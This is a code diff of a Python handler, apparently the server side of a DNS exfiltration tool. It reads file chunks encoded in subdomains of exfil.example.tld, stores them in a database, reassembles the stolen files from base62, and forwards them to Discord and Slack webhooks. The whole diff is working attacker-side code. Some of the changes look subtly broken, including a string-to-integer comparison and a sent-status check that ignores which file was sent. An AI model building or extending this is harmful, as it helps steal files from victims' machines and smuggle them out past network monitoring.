@@ -1,6 +1,9 @@
 import os, base62
 from dotenv import load_dotenv; load_dotenv()
 
+import modules.database as db
+import modules.queries  as queries
+
 import modules.postoffice as Postoffice
 from modules.serialize import deserialize_from_header 
 
@@ -9,8 +12,8 @@ from modules.serialize import deserialize_from_header
 SLACK_WEBHOOK   = os.getenv("SLACK_WEBHOOK")
 DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK")
 
-COMPILE  = { } # TODO: Replace with a database
 WEBHOOKS = [ SLACK_WEBHOOK, DISCORD_WEBHOOK ]
+SEEN_SHA = {  } # SHA : file_id
 
 
 def handle_exfil( domain : str ):
@@ -18,6 +21,8 @@ def handle_exfil( domain : str ):
     Parse & Handle the exfiltrated data received from the Domain Lookup.
     Will send the result to Discord, if a Discord webhook is provided.
     """
+    
+    global SEEN_SHA
     
     #  Domain format for Exfil:
     #      DATA_PART.ID_PART.SHA_PART.exfil.example.tld
@@ -40,38 +45,74 @@ def handle_exfil( domain : str ):
     id_part   = subdomains[ 1 ]
     sha_part  = subdomains[ 2 ]
     
-    if id_part == "0":
+    if str(id_part) == "0":
         data = deserialize_from_header(data_part)
-        
-        print( data, sha_part )
         
         filename = data["name"]
         filesize = data["size"]
         
-        COMPILE[ sha_part ] = {}
-        COMPILE[ sha_part ]["name"] = filename
-        COMPILE[ sha_part ]["size"] = int(filesize)
-        COMPILE[ sha_part ]["data"] = ""
-        return True    
-    
-    if sha_part in COMPILE:
-        COMPILE[sha_part]["data"] += data_part
+        file_id = db.query_database( queries.get_fileid_with_sha, (sha_part,) )
+
+        if file_id != []:
+            return 
         
-    if int(id_part) == COMPILE[ sha_part ]["size"]:
-        numbers = base62.decode( COMPILE[ sha_part ]["data"] )
+        db.insert_data(
+            queries.insert_into_files,
+            (filename, filesize, sha_part)
+        )
     
+        SEEN_SHA[ sha_part ] = db.query_database( queries.get_fileid_with_sha, (sha_part,) )
+        
+
+    if sha_part in SEEN_SHA and id_part != 0:
+        
+        # Insert chunks
+        db.insert_data(
+            queries.insert_into_filechunk,
+            ( sha_part, id_part, data_part )
+        )
+        
+        # Check if all chunks have been retrieved
+        file_size    = db.query_database( queries.get_size_with_sha, (sha_part,) )[0][0]
+        chunk_amount = db.query_database( queries.check_filechunks,  (sha_part,) )[0][0]
+        if chunk_amount - 1 != file_size:
+            return
+        
+        
+        # If they're, reconstruct the file
+        chunks     = db.query_database( queries.get_filechunks, (sha_part,) )
+            
+        all_chunks = "".join([(chunk[0], chunk[1])[1] for chunk in chunks])
+        numbers = base62.decode( all_chunks )
+            
         file_data = numbers.to_bytes((numbers.bit_length() + 7) // 8, "big")
-        file_name = COMPILE[sha_part]["name"]
-    
-        Postoffice.send(
+        file_name = db.query_database( queries.get_name_with_sha, (sha_part,) )[0][0]
+            
+        # Prevent duplicate send
+        file_sent_previously = db.query_database( queries.get_sent_status )
+        if file_sent_previously != []:
+            return
+        
+        # Send the reconstructed file
+        file_sent = Postoffice.send(
             WEBHOOKS,
             Postoffice.Discord_message( 
                 files   = [ (file_name, file_data) ] 
             )
         )
 
-        del COMPILE[sha_part]
-
+        if not file_sent:
+            print( "Error: Could not send message." )
+            return
+        
+        file_id = db.query_database( queries.get_fileid_with_sha, (sha_part,) )[0][0]
+        
+        _ = db.insert_data(
+            queries.insert_into_sentlog,
+            (file_id,1)
+        )
+        
+    
     return
 
 
